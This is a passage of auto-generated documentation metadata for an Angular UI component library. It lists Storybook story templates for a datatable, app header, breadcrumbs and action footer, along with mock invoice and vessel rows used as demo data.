          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<Partial<StoDatatableComponent<Record<string, >>>>",
          "defaultValue": "args => ( {\n  props: args,\n  template: `<h3>With column groups</h3>\n<div >\n<sto-datatable [groups]=\"groups\" [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\"></sto-datatable>\n</div>`,\n} )"
        },
        {
          "name": "MultilineFooter",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<Partial<StoDatatableComponent<Record<string, >>>>",
          "defaultValue": "args => ( {\n  props: args,\n  template: `<h3>The table takes in a list of footer rows</h3>\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\"></sto-datatable>`,\n} )"
        },
        {
          "name": "Paging",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story",
          "defaultValue": "(args) => ( {\n  props: {\n    page: action('Page change'),\n    setPage: (pageEvent: { pageIndex: number; }, that: { visibleRows: { total: unknown; invoiceNo: number; voyageNo: number; vesselName: string; allocated: number; }[]; }) => {\n      const startAt = pageEvent.pageIndex * 30;\n      const endAt = ( pageEvent.pageIndex + 1 ) * 30 - 1;\n      that.visibleRows = [ ...rows ].slice(startAt, endAt);\n    },\n    ...args\n  },\n  template: `\n<h3>Paging is done by using <a href=\"https://material.angular.io/components/paginator/overview\" target=\"_blank\">mat-paginator</a></h3>\n<mat-card class=\"sto-card\" (resize)=\"resize()\">\n<sto-datatable [sortable]=\"true\" [resizeable]=\"true\" [scrollbarH]=\"true\" [virtualScroll]=\"false\" [height]=\"height\" [rows]=\"visibleRows\" [columns]=\"columns\">\n    <mat-paginator (page)=\"setPage($event, this); page($event)\" [showFirstLastButtons]=\"true\" [length]=\"rows.length\" [hidePageSize]=\"true\" [pageSize]=\"30\" [pageIndex]=\"activePage\"></mat-paginator>\n</sto-datatable>\n</mat-card>`\n} )"
        },
        {
          "name": "ResponsiveMode",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story",
          "defaultValue": "(args) => ( {\n  props: args,\n  styles: [\n    `.container {\n      transition: width 300ms linear;\n    }`\n  ],\n  template: `\n<h3>Responsive mode will make the grid break into a list, allowing for a simpler view</h3>\n<div class=\"container\" [style.width.px]=\"emulateSmallElement ? breakpoint - 1 : 1000\">\n<sto-datatable [virtualScroll]=\"true\"\n[responsiveBreakPoint]=\"breakpoint\"\n[responsive]=\"true\"\n[responsiveView]=\"responsive\"\n[height]=\"400\"\n[rows]=\"rows\"\n[columns]=\"columns\"></sto-datatable>\n<ng-template #responsive let-row=\"row\"><span [matTooltip]=\"row | json\">{{ row | json }}</span></ng-template>\n</div>`\n} )"
        }
      ],
      "libs/common/src/lib/sto-action-footer/action-footer.stories.ts": [
        {
          "name": "ActionFooter",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        },
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoActionFooterComponent>",
          "defaultValue": "(args: StoActionFooterComponent) => {\n  return {\n    component: StoActionFooterComponent,\n    props: {\n      ...args,\n      save: action('Save'),\n      cancel: action('Cancel')\n    },\n    template: '<sto-action-footer [isLoading]=\"isLoading\" [position]=\"position\" [shouldAddClass]=\"shouldAddClass\"><button mat-flat-button (click)=\"save()\" color=\"primary\">Save</button><button (click)=\"cancel()\" mat-button>Cancel</button></sto-action-footer>'\n  };\n}"
        }
      ],
      "libs/core/src/lib/sto-directives/sto-grid.directive.ts": [
        {
          "name": "ALL_GRIDS",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "defaultValue": "[ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ]"
        },
        {
          "name": "getClass",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "(width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n}"
        }
      ],
      "libs/common/src/lib/sto-app-header/app-header.stories.ts": [
        {
          "name": "AppHeader",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        },
        {
          "name": "AsTestEnvironment",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoAppHeaderComponent>",
          "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: {\n      ...args,\n      environmentName: 'Systemtest',\n      testEnvironment: true,\n    },\n    template: `<sto-app-header [breadCrumbs]=\"[ { label: 'Root' }, { label: 'SubModule' } ]\" [environmentName]=\"environmentName\" [testEnvironment]=\"true\"></sto-app-header>`\n  };\n}"
        },
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<>",
          "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: args,\n    template: `<sto-app-header [breadCrumbs]=\"breadCrumbs\" [environmentName]=\"environmentName\" [testEnvironment]=\"testEnvironment\"></sto-app-header>`\n  };\n}"
        },
        {
          "name": "withForm",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoAppHeaderComponent>",
          "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: {\n      ...args,\n      breadCrumbs: [\n        { label: 'Root', command: action('Root clicked'), segment: '' },\n        { label: 'SubModule', command: action('SubModule clicked'), segment: 'submodule' },\n        { label: 'Third level!', command: action('Third clicked'), segment: 'third' }\n      ],\n      environmentName: 'Systemtest',\n      homeConfig: { command: action('Home clicked') },\n      testEnvironment: true,\n    },\n    styles: [\n      '::ng-deep body .sto-header { left: 0; width: 100% !important; }'\n    ],\n    template: `\n<sto-app-header [userMenu]=\"menu\" [breadCrumbs]=\"breadCrumbs\" [homeBreadCrumbConfig]=\"homeConfig\">\n  <div class=\"sto-header__form\">\n    <mat-form-field stoFormField floatLabel=\"never\" style=\"width: 600px\">\n      <mat-icon matPrefix>search</mat-icon>\n      <mat-label>Search</mat-label>\n      <input matInput>\n    </mat-form-field>\n  </div>\n</sto-app-header>\n<mat-menu #menu=\"matMenu\"><button mat-menu-item><mat-icon>settings</mat-icon>User Name</button></mat-menu>\n`\n  };\n}"
        },
        {
          "name": "WithUserMenu",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<StoAppHeaderComponent>",
          "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: {\n      ...args,\n      breadCrumbs: [\n        { label: 'Root', command: action('Root clicked'), segment: '' },\n        { label: 'SubModule', command: action('SubModule clicked'), segment: 'submodule' },\n        { label: 'Third level!', command: action('Third clicked'), segment: 'third' }\n      ],\n      environmentName: 'Systemtest',\n      homeConfig: { command: action('Home clicked') },\n      testEnvironment: true,\n    },\n    styles: [\n      '::ng-deep body .sto-header { left: 0; width: 100% !important; }'\n    ],\n    template: `\n<sto-app-header [userMenu]=\"menu\" [breadCrumbs]=\"breadCrumbs\" [homeBreadCrumbConfig]=\"homeConfig\">\n<button mat-icon-button><mat-icon>home</mat-icon></button>\n</sto-app-header>\n<mat-menu #menu=\"matMenu\"><button mat-menu-item><mat-icon>settings</mat-icon>User Name</button></mat-menu>\n`\n  };\n}"
        }
      ],
      "libs/common/src/test-utils.ts": [
        {
          "name": "breadCrumbs",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/test-utils.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Breadcrumb[]",
          "defaultValue": "[\n  {\n    label: 'One',\n    command: () => {\n      console.log('Wat?');\n    }\n  }, {\n    label: 'Two',\n    command: () => {\n    },\n    segment: '2',\n  },\n]"
        }
      ],
      "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts": [
        {
          "name": "Breadcrumbs",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        },
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<>",
          "defaultValue": "(args: StoBreadcrumbsComponent) => {\n  return {\n    props: args,\n    // template: `<sto-app-header [breadCrumbs]=\"breadCrumbs\" [environmentName]=\"environmentName\" [testEnvironment]=\"testEnvironment\"></sto-app-header>`\n  };\n}"
        }
      ],
      "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts": [
        {
          "name": "COLORS",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "defaultValue": "[\n  'primary', 'accent', 'warning', 'danger', 'success'\n]"
        }
      ],
      "libs/datatable/src/lib/rows.ts": [
        {
          "name": "columns",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/rows.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "defaultValue": "[\n  {\n    prop: 'invoiceNo',\n    name: 'Invoice# (randsort)',\n    flexBasis: 200,\n    flexShrink: 1,\n    flexGrow: 1,\n    // random sort\n    sortFn: () => {\n      let n = Math.round(Math.random() * 1000);\n      if (n < 500) {\n        n = -n;\n      }\n      return n;\n    }\n  },\n  {\n    prop: 'voyageNo',\n    flexBasis: 200,\n    disableResize: true,\n    name: 'Voyage# (no resize)',\n    disableSort: true,\n    headerClass: 'aclass',\n    cellClass: () => {\n      return 'a-cell-class';\n    }\n  },\n  {\n    prop: 'vesselName',\n    flexBasis: 200,\n    name: 'Vessel',\n    headerClass: 'bclass',\n    flexGrow: 1\n  },\n  {\n    prop: 'allocated',\n    flexBasis: 200,\n    name: 'Allocated',\n    headerClass: 'aclass'\n  },\n  {\n    prop: 'total',\n    flexBasis: 200,\n    name: 'Total',\n    headerClass: 'aclass',\n    cellClass: 'a-cell-class'\n  }\n]"
        },
        {
          "name": "fixedColumns",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/rows.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "defaultValue": "[...columns.map(col => ({...col, flexGrow: 0})), ...columns.map(col => ({\n  ...col,\n  flexGrow: 0\n}))]"
        },
        {
          "name": "manyColumns",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/rows.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "defaultValue": "[...columns, ...columns, ...columns]"
        },
        {
          "name": "pipe",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/rows.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "new NumberFormatPipe()"
        },
        {
          "name": "rows",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/lib/rows.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "[\n  {\n    'invoiceNo': 212666588,\n    'voyageNo': 16206,\n    'vesselName': 'False Cloak Fern',\n    'allocated': 486958,\n    'total': 367817\n}, {\n    'invoiceNo': 209381561,\n    'voyageNo': 16897,\n    'vesselName': 'Weak Signalgrass',\n    'allocated': 435757,\n    'total': 306822\n}, {\n    'invoiceNo': 276445387,\n    'voyageNo': 16723,\n    'vesselName': 'Southern Red Oak',\n    'allocated': 434782,\n    'total': 304761\n}, {\n    'invoiceNo': 240525031,\n    'voyageNo': 17412,\n    'vesselName': 'Hollyleaf Buckthorn',\n    'allocated': 498118,\n    'total': 518295\n}, {\n    'invoiceNo': 208251845,\n    'voyageNo': 15732,\n    'vesselName': 'Western Sandparsley',\n    'allocated': 483548,\n    'total': 409397\n}, {\n    'invoiceNo': 244864110,\n    'voyageNo': 15313,\n    'vesselName': 'Kern Buckwheat',\n    'allocated': 413287,\n    'total': 374936\n}, {\n    'invoiceNo': 213639557,\n    'voyageNo': 17502,\n    'vesselName': 'Greenleaf Manzanita',\n    'allocated': 478124,\n    'total': 362754\n}, {\n    'invoiceNo': 255930079,\n    'voyageNo': 15029,\n    'vesselName': 'Blue Skullcap',\n    'allocated': 464448,\n    'total': 483236\n}, {\n    'invoiceNo': 204028785,\n    'voyageNo': 17325,\n    'vesselName': 'Coca',\n    'allocated': 412084,\n    'total': 319574\n}, {\n    'invoiceNo': 215898267,\n    'voyageNo': 17556,\n    'vesselName': 'Fendler\\'s Pennycress',\n    'allocated': 467666,\n    'total': 401105\n}, {\n    'invoiceNo': 283652560,\n    'voyageNo': 16693,\n    'vesselName': 'Densespike Blazing Star',\n    'allocated': 428117,\n    'total': 422318\n}, {\n    'invoiceNo': 261627486,\n    'voyageNo': 16742,\n    'vesselName': 'Texas Crab Apple',\n    'allocated': 445829,\n    'total': 389401\n}, {\n    'invoiceNo': 224657257,\n    'voyageNo': 17344,\n    'vesselName': 'Philodendron',\n    'allocated': 439503,\n    'total': 197357\n}, {\n    'invoiceNo': 287799672,\n    'voyageNo': 18559,\n    'vesselName': 'Knife Acacia',\n    'allocated': 457225,\n    'total': 152586\n}, {\n    'invoiceNo': 249855102,\n    'voyageNo': 17210,\n    'vesselName': 'Catnip Noseburn',\n    'allocated': 490793,\n    'total': 295054\n}, {\n    'invoiceNo': 217932979,\n    'voyageNo': 18294,\n    'vesselName': 'Brickellbush Goldenweed',\n    'allocated': 476987,\n    'total': 90357\n}, {\n    'invoiceNo': 287187542,\n    'voyageNo': 18123,\n    'vesselName': 'Threecornerjack',\n    'allocated': 436103,\n    'total': 98431\n}, {\n    'invoiceNo': 277359566,\n    'voyageNo': 17549,\n    'vesselName': 'Longleaf Isodendrion',\n    'allocated': 456456,\n    'total': 292117\n}, {\n    'invoiceNo': 250935681,\n    'voyageNo': 16429,\n    'vesselName': 'Purple False Gilyflower',\n    'allocated': 465653,\n    'total': 396830\n}, {\n    'invoiceNo': 261927204,\n    'voyageNo': 16524,\n    'vesselName': 'Nevada Pea',\n    'allocated': 411190,\n    'total': 393332\n}, {\n    'invoiceNo': 203826163,\n    'voyageNo': 17608,\n    'vesselName': 'Alaska Tall Bluebells',\n    'allocated': 487745,\n    'total': 273514\n}, {\n    'invoiceNo': 253006185,\n    'voyageNo': 17795,\n    'vesselName': 'Cupped Monolopia',\n    'allocated': 491265,\n    'total': 117277\n}, {\n    'invoiceNo': 212369622,\n    'voyageNo': 17867,\n    'vesselName': 'Small Rocklettuce',\n    'allocated': 408880,\n    'total': 530690\n}, {\n    'invoiceNo': 259555515,\n    'voyageNo': 16488,\n    'vesselName': 'Torchwood',\n    'allocated': 428843,\n    'total': 63208\n}, {\n    'invoiceNo': 209064476,\n    'voyageNo': 17957,\n    'vesselName': 'Saline Saltbush',\n    'allocated': 452602,\n    'total': 144560\n}, {\n    'invoiceNo': 246761266,\n    'voyageNo': 18253,\n    'vesselName': 'White Snakeroot',\n    'allocated': 485075,\n    'total': 133101\n}, {\n    'invoiceNo': 277989052,\n    'voyageNo': 15535,\n    'vesselName': 'Bayberry',\n    'allocated': 411595,\n    'total': 549473\n}, {\n    'invoiceNo': 246327302,\n    'voyageNo': 17427,\n    'vesselName': 'China Violet',\n    'allocated': 426753,\n    'total': 406017\n}, {\n    'invoiceNo': 225951335,\n    'voyageNo': 15473,\n    'vesselName': 'Olympic Saxifrage',\n    'allocated': 429650,\n    'total': 413380\n}, {\n    'invoiceNo': 206579573,\n    'voyageNo': 17600,\n    'vesselName': 'False Sun-rose',\n    'allocated': 464983,\n    'total': 474611\n}, {\n    'invoiceNo': 243806520,\n    'voyageNo': 15148,\n    'vesselName': 'Bracted Lousewort',\n    'allocated': 486907,\n    'total': 419416\n}, {\n    'invoiceNo': 248037555,\n    'voyageNo': 16554,\n    'vesselName': 'Beach Strawberry',\n    'allocated': 446762,\n    'total': 543982\n}, {\n    'invoiceNo': 233807782,\n    'voyageNo': 18251,\n    'vesselName': 'Western Bog Yellowcress',\n    'allocated': 485749,\n    'total': 206612\n}, {\n    'invoiceNo': 231399318,\n    'voyageNo': 18647,\n    'vesselName': 'Nevada Pea',\n    'allocated': 416624,\n    'total': 73797\n}, {\n    'invoiceNo': 210265421,\n    'voyageNo': 17334,\n    'vesselName': 'Silver Bird\\'s-foot Trefoil',\n    'allocated': 493556,\n    'total': 485404\n}, {\n    'invoiceNo': 270110020,\n    'voyageNo': 15750,\n    'vesselName': 'Dotted Lancepod',\n    'allocated': 439009,\n    'total': 85163\n}, {\n    'invoiceNo': 203365491,\n    'voyageNo': 15574,\n    'vesselName': 'Arizona Whitefeather',\n    'allocated': 424981,\n    'total': 72976\n}, {\n    'invoiceNo': 258026382,\n    'voyageNo': 17991,\n    'vesselName': 'Rough Blackfoot',\n    'allocated': 412805,\n    'total': 525915\n}, {\n    'invoiceNo': 216800989,\n    'voyageNo': 18938,\n    'vesselName': 'Narrowleaf Wirelettuce',\n    'allocated': 437679,\n    'total': 384426\n}, {\n    'invoiceNo': 224161270,\n    'voyageNo': 15475,\n    'vesselName': 'Utah Sweetvetch',\n    'allocated': 414735,\n    'total': 398700\n}, {\n    'invoiceNo': 224587536,\n    'voyageNo': 16133,\n    'vesselName': 'Palau Horsfieldia',\n    'allocated': 409836,\n    'total': 55599\n}, {\n    'invoiceNo': 200019644,\n    'voyageNo': 16430,\n    'vesselName': 'Cracked Lichen',\n    'allocated': 491135,\n    'total': 400179\n}, {\n    'invoiceNo': 212973644,\n    'voyageNo': 16527,\n    'vesselName': 'California Valerian',\n    'allocated': 465742,\n    'total': 428281\n}, {\n    'invoiceNo': 236726871,\n    'voyageNo': 15145,\n    'vesselName': 'Spear Saltbush',\n    'allocated': 420067,\n    'total': 236753\n}, {\n    'invoiceNo': 262498296,\n    'voyageNo': 16350,\n    'vesselName': 'Rose Globemallow',\n    'allocated': 472387,\n    'total': 270655\n}, {\n    'invoiceNo': 237959767,\n    'voyageNo': 18739,\n    'vesselName': 'Cithara Buckwheat',\n    'allocated': 447466,\n    'total': 358262\n}, {\n    'invoiceNo': 200461954,\n    'voyageNo': 18921,\n    'vesselName': 'Rough Potato',\n    'allocated': 425594,\n    'total': 459497\n}, {\n    'invoiceNo': 266033549,\n    'voyageNo': 16150,\n    'vesselName': 'Distictis',\n    'allocated': 447636,\n    'total': 286350\n}, {\n    'invoiceNo': 289893009,\n    'voyageNo': 18219,\n    'vesselName': 'Piedmont False Pimpernel',\n    'allocated': 474098,\n    'total': 163688\n}, {\n    'invoiceNo': 241320630,\n    'voyageNo': 15558,\n    'vesselName': 'Southern Mexican Sage',\n    'allocated': 431537,\n    'total': 419734\n}, {\n    'invoiceNo': 211404482,\n    'voyageNo': 18502,\n    'vesselName': 'Bearded Sprangletop',\n    'allocated': 458939,\n    'total': 89714\n}, {\n    'invoiceNo': 247917426,\n    'voyageNo': 18238,\n    'vesselName': 'Small-flowered Calycadenia',\n    'allocated': 406198,\n    'total': 351785\n}, {\n    'invoiceNo': 234633032,\n    'voyageNo': 17269,\n    'vesselName': 'Pritchardia',\n    'allocated': 442188,\n    'total': 414638\n}, {\n    'invoiceNo': 216477974,\n    'voyageNo': 15454,\n    'vesselName': 'Thread Lichen',\n    'allocated': 474232,\n    'total': 537142\n}, {\n    'invoiceNo': 201667786,\n    'voyageNo': 15130,\n    'vesselName': 'Margined Stickseed',\n    'allocated': 493253,\n    'total': 364145\n}, {\n    'invoiceNo': 271891491,\n    'voyageNo': 15468,\n    'vesselName': 'Eggleaf Milkwort',\n    'allocated': 457747,\n    'total': 316780\n}, {\n    'invoiceNo': 223744528,\n    'voyageNo': 16074,\n    'vesselName': 'Hall\\'s Mule-ears',\n    'allocated': 439241,\n    'total': 301239\n}, {\n    'invoiceNo': 202936481,\n    'voyageNo': 18868,\n    'vesselName': 'Rinodina Lichen',\n    'allocated': 488291,\n    'total': 504547\n}, {\n    'invoiceNo': 284610720,\n    'voyageNo': 17077,\n    'vesselName': 'Saber Bogmat',\n    'allocated': 417817,\n    'total': 246511\n}, {\n    'invoiceNo': 286535852,\n    'voyageNo': 15935,\n    'vesselName': 'Brodiaea',\n    'allocated': 479989,\n    'total': 276206\n}, {\n    'invoiceNo': 206000446,\n    'voyageNo': 17528,\n    'vesselName': 'Utah Serviceberry',\n    'allocated': 454837,\n    'total': 399887\n}, {\n    'invoiceNo': 283036494,\n    'voyageNo': 16899,\n    'vesselName': 'Lehua Makanoe',\n    'allocated': 452547,\n    'total': 96023\n}, {\n    'invoiceNo': 270371913,\n    'voyageNo': 16886,\n    'vesselName': 'Rim Lichen',\n    'allocated': 439082,\n    'total': 269557\n}, {\n    'invoiceNo': 273513209,\n    'voyageNo': 15570,\n    'vesselName': 'Andrews\\' Rhizomnium Moss',\n    'allocated': 471494,\n    'total': 131750\n}, {\n    'invoiceNo': 215244773,\n    'voyageNo': 17618,\n    'vesselName': 'Lesser Pond Sedge',\n    'allocated': 472422,\n    'total': 505921\n}, {\n    'invoiceNo': 264815411,\n    'voyageNo': 17008,\n    'vesselName': 'Browne\\'s Savory',\n    'allocated': 464834,\n    'total': 420180\n}, {\n    'invoiceNo': 260793904,\n    'voyageNo': 18868,\n    'vesselName': 'Bastard Copperleaf',\n    'allocated': 403983,\n    'total': 190831\n}, {\n    'invoiceNo': 228919503,\n    'voyageNo': 16736,\n    'vesselName': 'Himalayan Cypress',\n    'allocated': 418664,\n    'total': 450233\n}, {\n    'invoiceNo': 225534860,\n    'voyageNo': 18374,\n    'vesselName': 'Fiddleleaf Hawksbeard',\n    'allocated': 495477,\n    'total': 528500\n}, {\n    'invoiceNo': 205039289,\n    'voyageNo': 15221,\n    'vesselName': 'Maui Cyanea',\n    'allocated': 434081,\n    'total': 79021\n}, {\n    'invoiceNo': 219730920,\n    'voyageNo': 18931,\n    'vesselName': 'Garden Sorrel',\n    'allocated': 442584,\n    'total': 193166\n}, {\n    'invoiceNo': 229994865,\n    'voyageNo': 16404,\n    'vesselName': 'Waialeale Dubautia',\n    'allocated': 414377,\n    'total': 195495\n}, {\n    'invoiceNo': 289807557,\n    'voyageNo': 16151,\n    'vesselName': 'Onetooth Woodfern',\n    'allocated': 415673,\n    'total': 202974\n}, {\n    'invoiceNo': 289750833,\n    'voyageNo': 15827,\n    'vesselName': 'Greenland Orange Lichen',\n    'allocated': 416432,\n    'total': 146021\n}, {\n    'invoiceNo': 243948439,\n    'voyageNo': 18154,\n    'vesselName': 'Leafy Reedgrass',\n    'allocated': 441439,\n    'total': 248631\n}, {\n    'invoiceNo': 266718010,\n    'voyageNo': 15322,\n    'vesselName': 'Largeleaf Marshpennywort',\n    'allocated': 436736,\n    'total': 256997\n}, {\n    'invoiceNo': 285338933,\n    'voyageNo': 18884,\n    'vesselName': 'Musk Okra',\n    'allocated': 414918,\n    'total': 475276\n}, {\n    'invoiceNo': 284544908,\n    'voyageNo': 16825,\n    'vesselName': 'Stegonia Moss',\n    'allocated': 486396,\n    'total': 210718\n}, {\n    'invoiceNo': 200951860,\n    'voyageNo': 15681,\n    'vesselName': 'Black Rock Townsend Daisy',\n    'allocated': 437133,\n    'total': 358340\n}, {\n    'invoiceNo': 248838992,\n    'voyageNo': 18254,\n    'vesselName': 'Kern Canyon Clarkia',\n    'allocated': 414245,\n    'total': 164454\n}, {\n    'invoiceNo': 274109340,\n    'voyageNo': 18252,\n    'vesselName': 'Squarrose Knapweed',\n    'allocated': 408814,\n    'total': 159690\n}, {\n    'invoiceNo': 219721177,\n    'voyageNo': 16331,\n    'vesselName': 'Lake County Dwarf-flax',\n    'allocated': 496150,\n    'total': 404922\n}, {\n    'invoiceNo': 272212685,\n    'voyageNo': 15395,\n    'vesselName': 'Ferngrass',\n    'allocated': 432853,\n    'total': 191127\n}, {\n    'invoiceNo': 243182762,\n    'voyageNo': 18321,\n    'vesselName': 'Marsh Grass',\n    'allocated': 462472,\n    'total': 452940\n}, {\n    'invoiceNo': 277839539,\n    'voyageNo': 17421,\n    'vesselName': 'Prairie Straw Sedge',\n    'allocated': 406837,\n    'total': 271284\n}, {\n    'invoiceNo': 207952597,\n    'voyageNo': 17197,\n    'vesselName': 'Doublehorn Calicoflower',\n    'allocated': 477735,\n    'total': 400959\n}, {\n    'invoiceNo': 260636315,\n    'voyageNo': 15453,\n    'vesselName': 'Palmer\\'s Goldenrod',\n    'allocated': 450419,\n    'total': 309897\n}, {\n    'invoiceNo': 256449906,\n    'voyageNo': 15189,\n    'vesselName': 'Oregon Checkerbloom',\n    'allocated': 435139,\n    'total': 139814\n}, {\n    'invoiceNo': 230023430,\n    'voyageNo': 15665,\n    'vesselName': 'Duckweed',\n    'allocated': 449282,\n    'total': 209512\n}, {\n    'invoiceNo': 226217229,\n    'voyageNo': 18462,\n    'vesselName': 'Disc Lichen',\n    'allocated': 471214,\n    'total': 58962\n}, {\n    'invoiceNo': 239201753,\n    'voyageNo': 18676,\n    'vesselName': 'Antifever Fontinalis Moss',\n    'allocated': 456585,\n    'total': 146024\n}, {\n    'invoiceNo': 235303844,\n    'voyageNo': 16223,\n    'vesselName': 'Miracle Fruit',\n    'allocated': 467877,\n    'total': 150931\n}, {\n    'invoiceNo': 217943418,\n    'voyageNo': 15418,\n    'vesselName': 'Little Gumweed',\n    'allocated': 494402,\n    'total': 355363\n}, {\n    'invoiceNo': 289788898,\n    'voyageNo': 15038,\n    'vesselName': 'Parish\\'s Oxytheca',\n    'allocated': 464853,\n    'total': 472823\n}, {\n    'invoiceNo': 280499130,\n    'voyageNo': 18914,\n    'vesselName': 'Jelly Lichen',\n    'allocated': 486477,\n    'total': 522679\n}, {\n    'invoiceNo': 223812339,\n    'voyageNo': 18298,\n    'vesselName': 'Evermann\\'s Fleabane',\n    'allocated': 453418,\n    'total': 50034\n}, {\n    'invoiceNo': 226331833,\n    'voyageNo': 17046,\n    'vesselName': 'Munj Sweetcane',\n    'allocated': 442239,\n    'total': 447072\n}, {\n    'invoiceNo': 226842057,\n    'voyageNo': 16491,\n    'vesselName': 'Trichostomum Moss',\n    'allocated': 450732,\n    'total': 471203\n}, {\n    'invoiceNo': 218377093,\n    'voyageNo': 18157,\n    'vesselName': 'Brown Stringybark',\n    'allocated': 441668,\n    'total': 464837\n}, {\n    'invoiceNo': 282690677,\n    'voyageNo': 16864,\n    'vesselName': 'Whorled Milkwort',\n    'allocated': 424456,\n    'total': 241177\n  }]\n  .map(row => ({...row, total: pipe.transform(row.total)}))"
        }
      ],
      "libs/datatable/src/testing/utils.ts": [
        {
          "name": "columns",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/testing/utils.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Column[]",
          "defaultValue": "[\n  { prop: 'invoiceNo', $$id: 'invoiceNo', name: 'invoiceNo', },\n  { prop: 'voyageNo', $$id: 'voyageNo', name: 'voyageNo', },\n  { prop: 'vesselName', $$id: 'vesselName', name: 'vesselName', },\n  { prop: 'allocated', $$id: 'allocated', name: 'allocated', },\n  { prop: 'total', $$id: 'total', name: 'total' },\n]"
        },
        {
          "name": "rows",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/testing/utils.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
